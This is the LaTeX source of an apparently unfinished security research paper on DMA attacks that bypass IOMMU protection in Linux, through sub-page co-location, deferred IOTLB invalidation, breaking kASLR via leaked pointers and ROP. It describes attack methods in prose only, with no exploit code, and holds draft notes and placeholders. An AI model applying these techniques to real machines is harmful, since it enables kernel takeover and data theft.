%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
% Template for USENIX papers.
%
% History:
%
% - TEMPLATE for Usenix papers, specifically to meet requirements of
%   USENIX '05. originally a template for producing IEEE-format
%   articles using LaTeX. written by Matthew Ward, CS Department,
%   Worcester Polytechnic Institute. adapted by David Beazley for his
%   excellent SWIG paper in Proceedings, Tcl 96. turned into a
%   smartass generic template by De Clarke, with thanks to both the
%   above pioneers. Use at your own risk. Complaints to /dev/null.
%   Make it two column with no page numbering, default is 10 point.
%
% - Munged by Fred Douglis <douglis@research.att.com> 10/97 to
%   separate the .sty file from the LaTeX source template, so that
%   people can more easily include the .sty file into an existing
%   document. Also changed to more closely follow the style guidelines
%   as represented by the Word sample file.
%
% - Note that since 2010, USENIX does not require endnotes. If you
%   want foot of page notes, don't include the endnotes package in the
%   usepackage command, below.
% - This version uses the latex2e styles, not the very ancient 2.09
%   stuff.
%
% - Updated July 2018: Text block size changed from 6.5" to 7"
%
% - Updated Dec 2018 for ATC'19:
%
%   * Revised text to pass HotCRP's auto-formatting check, with
%     hotcrp.settings.submission_form.body_font_size=10pt, and
%     hotcrp.settings.submission_form.line_height=12pt
%
%   * Switched from \endnote-s to \footnote-s to match Usenix's policy.
%
%   * \section* => \begin{abstract} ... \end{abstract}
%
%   * Make template self-contained in terms of bibtex entires, to allow
%     this file to be compiled. (And changing refs style to 'plain'.)
%
%   * Make template self-contained in terms of figures, to
%     allow this file to be compiled. 
%
%   * Added packages for hyperref, embedding fonts, and improving
%     appearance.
%   
%   * Removed outdated text.
%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

\documentclass[letterpaper,twocolumn,10pt]{article}
\usepackage{usenix2019_v3}
%\usepackage[sorting=none]{biblatex}

% to be able to draw some self-contained figs
\usepackage{tikz}
\usepackage{amsmath}
\usepackage{fancyvrb}
\usepackage{listings}
\usepackage{comment}

% inlined bib file
\usepackage{filecontents}
\providecommand{\shinfo}{\texttt{struct skb\_shared\_info }}
\providecommand{\page}{\texttt{struct page }}
\providecommand{\uarg}{\texttt{uarg }}
\providecommand{\kva}{kva }
\providecommand{\iova}{IOVA }
\providecommand{\mabaf}{malicious buffer }
\providecommand{\spb}{SPB\-2 }
%-------------------------------------------------------------------------------
\begin{document}
%-------------------------------------------------------------------------------

%don't want date printed
\date{}

% make title bold and 14 pt font (Latex default is non-bold, 16 pt)
\title{\Large \bf IOMMU and the Illusion of Safety}

% USENIX Security has double blind submissions
\begin{comment}
\author{
{\rm Markuze Alex}\\
Technion, VMware Research
\and
{\rm Gil Kupfer}\\
Technion
% copy the following lines to add more authors
\and
{\rm Nadav Amit}\\
VMware Research
\and{\rm Dan Tsafrir}\\
Technion, VMware Research
} % end author
\end{comment}

\maketitle

%-------------------------------------------------------------------------------
\begin{abstract}
%-------------------------------------------------------------------------------
\textcolor{magenta}{Your abstract text goes here. Just a few facts. Whet our appetites.
Not more than 200 words, if possible, and preferably closer to 150.\newline
We ignore the NDSS paper, the Linux attacks it mentions are at best half backed, which makes our contribution valid. We will still need to address it because the whole sub-page thing; but really its the Copy paper that introduced that notion and this is how we should frame it. The steps are \#1 Write paper as if NDSS doesn't exist. \#2 Add some defensive text when \#1 is complete}
\newline
\textcolor{blue}{Means, motive and opportunity; posioned KVA, DMA write access and vulberable cb pointer}
\end{abstract}


%-------------------------------------------------------------------------------
\section{Introduction}
Direct Memory Access (DMA) is a technology that allows input-output (I/O) devices to access the memory without CPU involvement. Before DMA, each I/O operation resulted in data being copied to and from the CPU, causing performance degradation. By letting devices access the memory directly, this copy overhead is avoided and the system is able to run faster. Yet, in its basic form, DMA makes the system vulnerable to DMA attacks, which are carried out by malicious devices that access memory regions not intended for their use. DMA attacks are well-known and have existed in the wild for over a decade \cite{Dor04,BDK10}. They range from stealing and manipulating sensitive data to taking over the victim machine. Popular attacks include: opening a locked computer \cite{MM, Fin14}; executing arbitrary code on the victim machine \cite{Fri16, Woj08, AD10}; stealing sensitive data items such as passwords \cite{SB12, LKV13, Cim16, BR12}; or extracting full memory dumps of victim machines for offline analysis \cite{MM, Vol, Fin14, GA10}. Modern systems protect themselves against DMA attacks using the input-output memory management unit (IOMMU). Inspired by the design of the ordinary MMU, the IOMMU adds a layer of virtual memory to devices. Instead of using physical addresses, the devices use I/O virtual addresses (IOVAs), which are translated into physical addresses by the IOMMU during each I/O transaction. Hence, devices are able to access only their mapped memory, leaving all other memory protected. Systems that use latest generation IOMMUs—and configure them correctly—are commonly believed to be fully protected from DMA attacks. In this work, by presenting several concrete attacks that remain valid even when an IOMMU is present in the system, we show that this perception is not true. Our attacks rely on the fact that operating systems (OSs) are usually long living, and are almost never designed from scratch. Even though it is possible to build a completely new operating system such that it will be fully protected, this task is very hard and not common. We claim that the way all state-of-the-art OSs treat I/O devices leads to wrong utilization of the IOMMU, and as a result makes them vulnerable. We start the work by exploring the disparity between IOMMU design and its actual utilization. In Chapter 3, we define and explain the sub-page granularity vulnerability and the deferred invalidation vulnerability, both caused by this gap. We also give a complete view of the attacks, including the attack boundaries and threat model. The sub-page granularity vulnerability comes from the fact that the IOMMU works in granularity of whole pages only. Using current technologies, it is impossible for an OS to define permissions for items smaller than a page. Yet, I/O buffers are typically smaller; in some cases, they are as small as a few bytes. Hence, I/O devices are able to access (potentially sensitive) data colocated with their buffers in the same page. Malicious devices might use this ability to manipulate or steal this data. Due the high cost of the translation process, the IOMMU caches the translations in the I/O translation look-aside buffer (IOTLB). The OS is responsible for removing stale entries from this buffer. Because of performance issues, OSs may defer the invalidation to a later time (Linux does it by default). This behavior exposes the system to the deferred invalidation vulnerability, which might be exploited by malicious devices that access the memory during the time the IOTLB is inconsistent with the IOMMU’s translation tables...
%-------------------------------------------------------------------------------
 
\section{Background}
\subsection{IOMMU}
\subsection{Mitigations}
\subsubsection{per device mappings}
\subsubsection{KASLR}
Memory models, pfn > page > kva
\subsubsection{NX-BIT}
\section{MMO}\label{sec:mmo}

In this section, we introduce the MMO (\motivation, \means, \oportunity) schema. We contend that a malicious device, just like a human criminal, needs Motive, Means, and Opportunity to perpetuate its attack. Using this schema, we can better understand the DMA vulnerabilities of an OS, the viability of possible DMA attacks, and their prevention. 

For example, using MMO schema, we are able to lay out the necessary conditions for a successful privilege escalation attack (i.e., code injection). Specifically, a malicious device needs all three prerequisites:
\begin{enumerate}
    \item \motivation: A kernel buffer filled with malicious code (e.g., a valid ROP attack) -- a \mabaf.
    \item \means: The kernel virtual address (\kva) of a \mabaf. Given the device is using \iova, the attacker needs to obtain the \kva{}, for example, by observing leaked pointers. 
    \item \oportunity: Write access to a known pointer, which can alter the CPU control flow. For example, write access to a data structure that holds a function callback pointer, at a known offset\footnote{The Linux kernel randomizes the layout of some data structures with \_\_randomize\_layout annotation \cite{rand_layout}.}.
\end{enumerate}

Another example is a full memory dump attack, which can be executed by merely having \oportunity. In this case, we are able to modify the kernel control flow in such a way as to cause it to dma\_map arbitrary kernel addresses at will. In order to achieve this, an attacker will need to modify a kernel pointer once before it is mapped and for a second time before send (i.e., TX) completion in order to avoid memory corruption (Section \ref{sec:linux_net}). 

To further emphasize the significance of the MMO attributes, we present a hypothetical scenario. Assume a NIC has write access to a page containing an RX packet (i.e., a received packet). Due to sub-page vulnerability and a random allocation coincidence, a structure with a callback pointer is inadvertently accessible with write permission. Also, the malicious device is able to create a valid \mabaf{} in the aforementioned page. It may seem that the device has a valid attack, whereas it actually lacks two essential prerequisites.

\begin{itemize}
    \item Missing \means: Without a valid \kva{} of the writable page, the device can not modify the callback function pointer to indicate the \mabaf.
    \item Missing \oportunity: Although a callback function pointer is available for modifications, the device has no way of knowing: 
    \begin{enumerate}
        \item[(a)] That a callback function pointer is available for sabotage.
        \item[(b)] The correct offset of the callback function pointer.
    \end{enumerate}
\end{itemize}

Under the hypothesized circumstance, and without additional information, a malicious device has practically no valid attack options. 
And while corrupting random kernel memory is still a possibility and may even cause a kernel panic \cite{MMT16}, it does not achieve the goal of privilege escalation.

\begin{figure}[t]
    \centering
    \includegraphics[width=1\columnwidth]{figs/subpage.pdf}
    \caption{Sub-page DMA vulnerabilities when the I/O buffer resides in
a page that also holds other data: (a) I/O buffer metadata, (b) memory allocator’s
metadata (c) randomly co-located sensitive buffers, (d) Page mapped by multiple \iova}
    \label{fig:colocation}
\end{figure}

\begin{comment}
\subsection{Attack Mechanics}
Given that:
\begin{enumerate}
    \item IOMMU hardware is correctly implemented 
    \item IOMMU is correctly initialized and on time
\end{enumerate}
%One might assume that the systems are safe from DMA attacks. We contend that this is not the case. The \textit{least-privilege principle} requires that an entity such as a software module or a physical device must always have only the minimum necessary access to operate normally. In this chapter, we describe the risks caused by software when this principle is violated.
\end{comment}

\subsection{Sub-Page Vulnerability}\label{sec:subpage}

We classify the different types of potentially co-located data, into four categories, as illustrated in Figure~\ref{fig:colocation}:

\begin{enumerate}
    \item[(a)] The I/O buffer is part of a bigger data structure. In some cases, this data structure may include function pointers. Often caused by poor DMA hygiene, by the driver authors. We demonstrate a full exploit in section \ref{sec:sbp2_attack}. A local driver is needed to fix such situation.
    \item[(b)] The OS (e.g., memory allocator) rather than the driver saves metadata, such as free-lists, on the same page as the I/O buffer \cite{Cor07}. Manipulating these data structures may also compromise the system  \cite{ak09}. Similar to (a), but this time its an OS subsystem that is at fault rather than the device driver. We demonstrate attacks, made possible, by an OS subsystem in section \ref{sec:linux_net}.
    \item[(c)] The I/O buffer and another dynamically allocated memory may coincidentally share a page. This common situation causes data leakage (e.g., kernel pointers).
    Currently, the Linux kernel uses the same memory allocation mechanism (e.g., kmalloc) for both I/O buffers and regular kernel memory use. Consequently, I/O buffers often share pages with other, potentially sensitive, kernel buffers. Since IOMMU works in page granularity, the respective I/O devices gain access to these kernel buffers as well. This, is a subclass of (b), as its caused by an OS subsystem; but the main difference is that, the exposed data structures are leaked randomly.
     \item[(d)] The same page is mapped multiple times due to co-located device driver buffers. Resulting in multiple \iova{} to the same page. A seemingly benign case, made dangerous by the fact, that unmapping one \iova{} is meaningless, security wise. The device will retain access to the physical page as long as a single valid \iova{} exists. We discuss the implications of this scenario in section \ref{sec:linux_net}.
\end{enumerate}

\subsection{Static Analysis Tool}

Inspired by the MMO schema, we devise a static code analysis tool to classify device drivers by levels of risk. With well over a 1000 \texttt{dma\_map*} function calls, in the Linux Kernel alone, a manual process would be arduous.
Our static analysis tool flags drivers where \means{} or \oportunity{} are present. In the case of I/O devices \motivation{} is usually trivial as the device has a legitimate write access. The tool looks for \texttt{dma\_map*} functions and traces back the call stack to identify if the mapped buffer is embedded inside a data structure (Figure \ref{fig:colocation} (a)); additionally we look for jeopardous functions (e.g \texttt{build\_skb}), that create a data structure inside a mapped buffer (Figure \ref{fig:colocation} (b)). The risk is classified according to the access permission, \motivation{}, implied by a READ permission, or \oportunity{} ,implied by a WRITE/BIDIRECTIONAL permission. 
Finally, the output of the tool presents structured and filtered findings conductive for deeper human expert analysis to determine if a viable attack is feasible.

%In case (a),  
%Other fields in such data structures might be dangerous as well.
%We used randomly colocated pointers to break kASLR, as we discuss in Chapter 5. Why do OSs ignore the disparity between I/O buffer allocation alignment and protection granularity? One possible explanation is the benefits of dense memory allocations: lower internal memory fragmentation, which results in higher memory utilization, and lower translation lookaside buffer (TLB) pressure, which reduces the number of TLB misses. We suspect, however, that the main reason for the disparity is actually more prosaic. As IOMMUs were introduced to commodity servers relatively recently, OS developers have been reluctant to overhaul existing device drivers and change the way they allocate and manage their memory. Instead, IOMMU mapping operations were abstracted from device drivers, and implemented on top of existing DMA APIs [MHJ, The]. As a result, the memory allocation of I/O buffers has not been modified and adapted to take into consideration the IOMMU protection granularity.

\subsection{Deferred Invalidation vulnerability} 
\begin{figure*}[t]
    \centering
    \includegraphics[width=1.3\columnwidth]{figs/deferred.png}
    \caption{Strict vs. deferred IOTLB invalidations. In deferred mode, there is a period
where the data is accessible but the mapping no longer exists.}
    \label{fig:deferred}
\end{figure*}
To translate addresses efficiently, the IOMMU caches translations in an input/output translation lookaside buffer (IOTLB). Like MMUs, IOMMUs do not maintain consistency between the IOTLB and the IOMMU page tables, which reside in memory; instead, the OS is required to restore consistency by explicitly invalidating the IOTLB. Therefore, to ensure that the IOTLB never holds stale entries, the OS must invalidate the IOTLB immediately after it removes memory mappings. Yet this scheme, called the “strict” mode in Linux, can degrade performance, as IOTLB invalidations can induce very high overhead \cite{MMT16,MSMT18,Peleg15}. In I/O intensive workloads, the number of required IOTLB invalidations can be extremely high, as IOMMU entries are unmapped following each I/O operation. Moreover, the overhead of each IOTLB invalidation can be as high as 2000 cycles \cite{ABYTS11}, considerably more than TLB invalidation, which takes roughly 100 cycles \cite{Han14}. To reduce this overhead, Linux defers TLB invalidations by default, and instead performs periodic global TLB invalidations. This “deferred” mode induces smaller performance overheads relative to the alternative “strict” mode. Nevertheless, as depicted in Figure \ref{fig:deferred}, deferring IOTLB invalidations may not prevent I/O devices from accessing unmapped pages, as the IOMMU may perform translations using stale IOTLB entries until the actual invalidation. This behavior introduces a security hazard, as the OS can reuse pages for other purposes after they are unmapped, regardless of the actual time of IOTLB invalidation. In the time window between the unmap operation and the actual invalidation, the OS may place sensitive data in the unmapped page-frame which the device may then read or modify. This time frame may be as high as 10 milliseconds when I/O traffic is low \cite{MSMT18}. In fact, this is a common scenario, as OSs prefer to reuse “hot” page-frames, recently freed, as they are likely to be already cached in the CPU caches\cite{hotcold}
. Therefore, it is possible in certain cases to predict how unmapped memory would be reused and which data it would expose.  
%As we demonstrate in Section 4.3, this behavior enables us to build robust assaults powerful enough to gain full control over a victim system.
\subsection{Threat Model}
Our attacks are built on the following assumptions:
\begin{enumerate}
    \item The actual attack is performed by a DMA-capable malicious device.
    \item There is software that violates the least-privilege principle with respect to the I/O device. The inherent vulnerabilities in the common use of the IOMMU make this a realistic assumption (§\ref{sec:sbp2_attack}). 
 \end{enumerate}
 The attacks discussed in this work are not executed by modifying the victim’s OS or drivers. We also assume that any hardware aside from the specific malicious device is working as expected, especially the DMA controller and the IOMMU itself. We also do not consider ports intended for debugging (e.g., jtag).
\subsection{Consequences}
The greatest potential consequence of our attacks is privilege escalation, which allows attackers to execute arbitrary code with kernel privileges. In all our experiments, we successfully executed code in the context of the kernel. Another, potential consequence is full system memory; these are harder to thwart and even harder to detect.  
Lastly, a consequence of a simple attack is denial of service \cite{MMT16}; where we crush the OS. Ideally, malformed devices should not be able to crash the entire system. The IOMMU is expected to properly isolate the devices from the OS to ensure this does not happen. Bad isolation, such as colocation of different types of data in the same page, may lead to system instability. To reach the above results, the attacker must have write permissions to some memory region. When an attacker has only read permissions, the consequences may still be interesting as they may lead to data leakage\cite{thunder}. The kernel often keeps sensitive data such as encryption keys and passwords as plain-text in memory. Attackers may use incorrect read permissions to leak this sensitive information.
\section{OS Defences}
In this section we discuss the common mechanisms used to mitigate code injection attacks. Subverting these countermeasures is essential to the success of any DMA attack.
\subsection{kASLR}
Address Space Layout Randomization (ASLR) is a common mechanism for mitigating code-execution attacks in the context of user-level processes. To inject code into a process, the attacker must know the memory layout. For example, the address of the code section is required for finding ROP gadgets \ref{sec:nx-bit}). Systems that support ASLR randomize the memory layout for each process on every execution. In this way, regular attacks, which are built for a specific layout, cannot work. Similarly, kASLR \cite{kalsr} randomizes the memory layout of the kernel. kASLR treats the entire kernel as a single region, randomizing only its base address. Hence, knowing even one pointer is enough to deduce the base address. Once the base address is known, the attacker can use it to patch the payload. In Linux, the high bits of every kernel pointer are always set to one. The specific number of bits depends on the region to which the pointer points. Even with kASLR, pointers to the kernel binary region are always in the range [0xffffffff80000000,0xffffffffc0000000)\footnote{The Linux memory layout is conveniently provided in 
\url{ https://elixir.bootlin.com/linux/v5.3.6/source/Documentation/x86/x86_64/mm.rst }
} and, therefore, they are very easy to detect. In addition, since (at least currently) kASLR works in multiplies of 2MB granularity, once a pointer is known, it is also easy to conclude to which symbol in the binary it points. Malicious devices can scan pages mapped for reading, looking for kernel pointers colocating with their buffers. Once such a pointer is identified, all that remains is to reduce the offset of the symbol in the binary from the pointer to get the base address. We found that there is a symbol visible to both FireWire and NICs in all Linux versions we tested, making it suitable for breaking kASLR. Starting from version 2.6.24, Linux supports network namespaces for isolating different instances of network use. 
\newline 
Every network object (and sockets, in particular) has a pointer to its namespace object. Moreover, at least one namespace is always defined by the global object init net. Since TX packets have varying sizes, NICs can see all kinds of dynamically allocated objects, including sockets. In addition, socket objects are about the same size as sbp2 management orb, making them allocated from the same pages. Hence, both of them can see socket objects and, thus also the address of init net. Using this pointer, the attacker can deduce the base address and complete the attack. Starting from version 4.8, the direct mapping base is also randomized (in alignment of at least 1GB), and it is guaranteed to be in the range [0xffff880000000000, 0xffffc80000000000).

\subsubsection{NX-BIT}\label{sec:nx-bit}
When exploiting a sub-page vulnerability (section \ref{sec:subpage}) a peripheral device has access with read/write permissions to memory buffers it shouldn't. Gaining write access to a function pointer can allow the attacker to inject malicious code. DMA capable devices, usually get access to pages with data, rather than code. Modern OSs make use of hardware support, namely the No-eXecute bit, to prevent running code from data pages. The bit for each page is defined in MMU’s page tables. Whenever the CPU tries to fetch code from memory, this bit is checked. If it is set, instead of running the code, the CPU will raise an exception to the OS, notifying it that someone is trying to break into the system. This method is known under the names NX\-bit, W xor X (Write xor eXecute) and DEP. Seemingly stopping any code injection attacks.\newline
Return Oriented Programming (ROP) Return Oriented Programming (ROP) is a common method used by malware to bypass DEP defenses \cite{RBSS12}. ROP takes advantage of the fact that the CPU stack pointer may point to any data page. To set up an attack from a data page, the attacker builds a stack filled with required data and pointers to special locations in the code section (aka ROP gadgets) in it. Each gadget is a short piece of code—usually one or two commands, and a return command. When the CPU executes a return command, the next address to fetch code from is taken from the stack. If the stack has been built correctly, the next address points to another gadget and so on. By carefully selecting these gadgets, an attacker may run any payload. A similar technique that uses jumps instead of returns—and, therefore, does not use the stack—is called Jump Oriented Programming (JOP) \cite{BJFL11}. The case when an attacker is able to overwrite the stack (e.g., buffer overflow in the stack) is simple. This, however, is not the common case, and it is not the case when talking about DMA pages or page cache. To make ROP work, the attacker must first pivot the stack into the data page. This is done using JOP gadgets that direct the stack pointer to the desired page.
\subsubsection{Mitigations in the wild}
\textcolor{magenta}{I imagine a table with OS on Y and best practices on X.
IOMMU policy, KASLR, NX-bit, discriminate mapping (R or W, not both), device IOVA separation, sand boxing mapped addresses.
Kernels Win,MacOS,FreeBSD - use NDSS paper, contribution: ESX (Need to send some emails), Linux - Ubuntu versions, Sless?(RHEL)}.
\section{attack setup}
Gil's ch.4
\section{Linux Network Stack}

\subsection{\shinfo}
The sk buff is a common data structure that is used in the Linux network stack to
hold information for representing a packet and is used by many network card drivers.
Basically, sk buff contains the packet’s metadata (e.g., its size and the protocol that
uses this packet) and several pointers to different locations in the data itself, which is
usually located in a different page (see Figure \footnote{Need Gil's figure}). The network stack supports packet
cloning by copying sk buff metadata and letting the new one point to the same data
as the old one. To support this data sharing, the skb shared info metadata structure
is located in a row with the data. Just as in the previous attack, skb shared info is
accidentally mapped for the device with the permissions of the packet (i.e., write for Rx
packets and read for Tx packets).
The main difference between this and the previous attack is that since the packet is
either Tx or Rx, but never both, we cannot deduce the virtual address of the packet as we did in the previous case. Hence, placing the payload in the same page is meaningless.

\subsection{Ring Flod}
To execute a successful DMA attack on an writable callback pointer; the attacking device needs a memory buffer filled with malicious code and the kernel address of that buffer.
Every RX packet is a possible buffer of malicious code, but the device is only given the buffer iova. The mapping between an iova and its kva is held in the device page table and the device driver meta-data; neither is accessible to the device. Additionally the \texttt{struct page} address is filled by the driver on RX but while we have write access we don't have read access. We must deduce a valid kva some other way.\newline
The boot process is deterministic; executing the same set of commands, initiating the same modules and allocating the same amount of memory each reboot. While the actual pages each module gets will vary in a multi-core machine due to timing issues, the drift is not expected to be to large. We evaluate this assumptions running 128 reboots on three Dell machines with different kernel versions. In the f\footnote{Please generate figure of RingFlod Results} we show the memory used by each driver and how many of the pfns repeat in more than X\% percent. Thus an adversary that has some knowledge about the physical setup and the kernel being used can guess with a high probability a valid kva for one of the RX pages. Whats left is to fill all the pages with a valid uarg struct with a callback pointer set back to it self, see fig \footnote{Need to generate a fig of a valid uarg}. Under the assumption of the default memory model\footnote{Figure out the memory model and show a calculation, best in figure}

\subsection{Privilege escalation}
sh\_info of a sent packet is read only to the NIC.
but if the \page holds malicious content that all the NIC needs. By copying the sh\_info of the TX skb to the sh\_info of an RX skb(can be generated at will). 
%T/O will happen 15 sec?

\subsection{Packet Forwarding}
Same can be achieved if the Linux sever allows for packet forwarding\footnote{Need to check what happens to sh\_info, (1.can we carry an "invisible" sh\_info - we can, but doesn't work as you need the driver to fill the kva) 2. or just forward a packet with frags (MTU, is usually a limiting factor)}

\subsection{sh\_info co-location breaks strict}
Additional challenge with attacking the sh\_info is the fact the the fields are filled and rewritten by the driver. As it turns out this is not a problem as multiple device drivers \footnote{make sure to get list from Gil's Thesis} first create an skb and only then unmap, allowing the device ample opportunity to annul the changes made by the driver. But even when the order is correct; the default mode in Linux us deferred protection and although the page was unmapped the device can still access it via the IOTLB. In the case of the strict protection, the device can still rewrite sh\_info due to the way sh\_info is allocated. 
\subsubsection{When page frags are used indiscriminately}
Unfortunately the following is not found in nature...\newline
In case where both TX and RX sh\_info come from the same page frag. The NIC can read arbitrary kernel addresses by modifying the frag list of a TX skb and making the driver map random addresses.
Being able to read the NIC can generate a large RX packet an just read the sh\_info frag written by the driver and 
\begin{comment}
\section{RDMA}
Remote DMA(RDMA)\footnote{Member Companies of Openfabrics alliance are mostly behind these technologies \url{https://www.openfabrics.org/}} is a set of protocols(Infiniband,IWARP,RoCE) that facilitate access to the main memory of a remote machines. We wanted to see if some of the attacks could be perpetrated via a malicious peer.  
We didn't find any risks associated with RDMA, other than the risks associated with device drivers, listed in this paper. The ipoib driver is one such driver, one which also maps \shinfo. A malicious device is still needed, as the post\_send/post\_receive API used by the ipoib driver is similar in function to the usual way NICs function; namely a remote user can't pick where to write or choose to write more than once to the same address. These kinds of operations are supported by rdma\_read/write API; which provides the peer with the ability to read/write from/to a specified addresses. We didn't find any uses for this kind of API in the Linux kernel. With post\_send/post\_receive API, the remote host can only modify legitimate memory buffers; and thus can't take advantage of sub-page vulnerabilities.
\textcolor{red}{Am I answering a question that no one asked?}
%\textcolor{red}{AFAIK; besides Linux only Windows supports RDMA in the kernel}
\end{comment}

\section{Related work}
In this section we cover previous works on mitigation, related works on IOMMU mitigation and additional related technologies.
\subsection{\textcolor{magenta}{NDSS paper}}
\textcolor{magenta}{Page 13, when all else is done, may spend some lines to rip into the ndss paper}

%\begin{comment}

\subsection{Circumventing IOMMU}
The IOMMU is open to several new kinds of attacks whose goal is to eliminate its protection. The first type target bad IOMMU implementations and the second focus on wrong initialization of the IOMMU. An example of bad implementations is the lack of interrupts remapping in the first IOMMU versions. Without the ability to forward only legitimate interrupts to the correct virtual machine, malicious devices might also generate on the host other interrupts. Rutkowska and Wojtczuk attacked the Intel VT-d by creating fake interrupts at the host, successfully executing code thanks to a bug in the interrupt mechanism on Intel machines \cite{WR11}. An example of wrong initialization is enabling I/O devices before setting up the IOMMU. Morgan et al. attacked the IOMMU by overriding its tables during initialization \cite{MANK16}. Frisk used a similar approach for stealing Apple FireVault passwords \cite{Cim16}. Sang et al. used both methods for several attacks \cite{SLND10}. First, they exploited the ability of the Intel VT-d to reduce IOTLB overhead by distributing entries to compatible I/O devices. Using this ability, malicious I/O devices can report false entries in order to access protected memory areas. Second, they capitalized on the fact that old implementations of the IOMMU identified I/O devices by self declarations. Malicious I/O devices can spoof the ID of an innocent one in order to access its memory. Last, they demonstrated how malicious I/O devices might exploit memory sharing with other I/O devices. Such sharing could, for example, be a decision of the OS according to the hardware topology. The picture would not be complete without an overview of attacks that simply ignore the presence of the IOMMU. Beniamini attacked the iPhone 7 and Nexus 5/6/6P through their Wi-Fi chips \cite{Ben17a, Ben17b}. While Nexus phones do not use an IOMMU, iPhones do. Beniamini, however, attacked the CPU by exploiting a TOCTOU (Time of Check – Time of Use) vulnerability in the NIC driver. From an I/O point of view, all the DMA writes were still legal (i.e. only to buffers that are currently explicitly mapped to the NIC). Also, modern IOMMU/PCI architectures includes the address translation services feature (PCI ATS; aka Device-IOTLB) that allows peripheral devices to serve as their own IOTLB. This feature is very unsecure and, in fact, lets malicious devices bypass the IOMMU protection by providing fake translations. In this work, we assume that the IOMMU is working as expected, so that it is possible to write an OS from scratch that utilizes the IOMMU correctly. OSs, however, are rarely written from scratch, as doing so is a very complex task. Our attacks thus target the methodology used by all commodity OSs to utilize the IOMMU in the real world. We have ignored ATS as it is unsecure by design.
%\end{comment}

\subsection{Protecting Against New attacks}
Deferred mode vulnerability could be mitigated by simply stopping batch IOTLB invalidations. To reduce performance overheads, one may batch the entire unmapping process rather than only the invalidation. Implementing such a solution will require a new memory management mechanism to keep the pages owned by the device. Implementing a page ownership mechanism could be beneficial for other cases as well, such as zero-copy buffers—which may be owned by one of the device, the kernel and user-level applications.
Sub-page vulnerability results from the gap between hardware design and software usages. Hence, it could be mitigated by modifying either the software or the hardware. Software modifications could be done either by repairing all broken drivers or, preferably, by changing the DMA layer so that it becomes aware of the size discrepancy. Hardware modification must be done centrally in the IOMMU in order to support legacy devices. Any solution that requires changes in I/O devices implies that secured environments could not include any currently existing device. In addition, common techniques against heap-overflow vulnerabilities might be used for making the attacks harder even though they will not completely eliminate them, as demonstrated above.
One possible software solution is to repair each and every driver that uses DMA. By making sure that drivers allocate memory for devices only in a page granularity, one could eliminate all sub-page issues. Even though this is probably the most obvious solution, it has the disadvantage of requiring a big change in existing code. In particular, legacy unsupported drivers must also be fixed to ensure that the system is truly secured. In addition, since every new driver should follow this guideline, the chance of creating new bugs is very high. This latter issue could be solved by additionally changing the DMA interface to accept only whole page mapping rather than arbitrary sized buffers.
Boyd-Wickizer and Zeldovich \cite{BWZ10} and LeVasseur et al. \cite{LUSG04} suggested isolating unmodified device drivers in user space programs and virtual machines, re- spectively. Similarly, Cinch used an isolated red virtual machine for intercepting bus traffic \cite{AWH16}. These methods could be applied to limit the damage of potential attacks in addition to other protection mechanisms. They do not, however, prevent code execution in the isolated environment. By attacking the isolation mechanism, attackers might still compromise the entire system.
Markuze et al. suggested that IOMMU driver should use bounce buffers \cite{MMT16}. Normally, device drivers invoke map/unmap requests for desired buffers through the DMA API. According to their suggestion, instead of dynamically mapping/unmapping pages, the DMA back-end would copy the buffer to/from designated pages with fixed mapping. By keeping separate data pages for each device, they avoid data colocation and, as a result, eliminate the sub-page granularity vulnerability. Since the mappings are static, the issue of deferred invalidation is eliminated as well. The advantage of this solution is that all code changes are centralized in the DMA layer. Nevertheless, this solution imposes huge overheads of data copying and memory wastage on the system. In a later work, Markuze et al. suggested reducing these overheads by implementing the DMA-Aware Malloc for Networking (DAMN) \cite{MSMT18}. DAMN allocates memory directly from the fixed-mapping pages, so there is no need to copy the buffers back and forth. This solution, however, requires code changes in the drivers and is not transparent.
Currently, there exist several hardware mechanisms for protecting CPU buffers smaller than a page. These mechanisms could be implemented in the IOMMU in order to mitigate the sub-page granularity vulnerability. Intel’s sup-page protecting technology suggests protecting fixed sized buffers smaller than a page \cite{Int18}. Since the buffers are still fixed sized, the same vulnerability remains, albeit in a more limited way. Intel MPX (Memory Protection Extensions) lets the user define boundaries for buffers and, later, explicitly checks that the corresponding pointers are between these boundaries \cite{Int16a}. Oracle SSM (Silicon Secured Memory) lets the user “color” buffers and associative pointers \cite{Ora15}. The color is implicitly checked for a match at each memory access. MPX, SSM and other similar approaches may be used for building a secure alternative for IOMMU. In practice, this means that the mappings are arbitrarily sized. An example of such an alternative is rIOMMU, which was designed to work optimally with network cards \cite{MABYT15}.Standard memory protection mechanisms include restriction of code executing areas and memory encryption. As we have shown above, DEP/kASLR do not prevent sub-page attacks. Encrypting sensitive data could prevent some forms of attacks (e.g., immediate data leakage). By leaking data using code that was injected by the DMA, Blass et al. have shown that encrypting sensitive data is not enough \cite{BR12}.
Common techniques against heap-overflow vulnerabilities may also be useful when they are properly implemented. For example, a recent Linux kernel patch suggests obfuscating the SLUB freelist by xor-ing its pointers with a random value \cite{Coo17}. This technique is very helpful in the case of simple heap overflow. In our scenario, however, the device was often able to read writable pages. Furthermore, old IOMMUs without special support of zero-length reads require writable pages to be readable as well \cite{Int16b}. Since the device can read the entire page, it is possible to deduce the random value from multiple obfuscated pointers. In contrast, obfuscating a single sensitive pointer poses a real difficulty to the exploiter even if the obfuscated pointer could be read first.
A completely different approach is to try to reduce the damage a working attack might cause rather than preventing it completely. This could be done by monitoring the behavior of devices and drivers for potential dangers. As with classic DMA attacks, monitoring the bus activity, looking for anomalies in DMA activity might be helpful for detecting live attacks \cite{Ste13}. This technique, however, still requires modeling each device DMA activity \cite{Ste14}. Similarly, monitoring mapping requests could be helpful during development. For example, one may look for known patterns, such as pointers or passwords, in a page during its mapping and detect bad practices in time.

\subsection{Additional Mitigations}
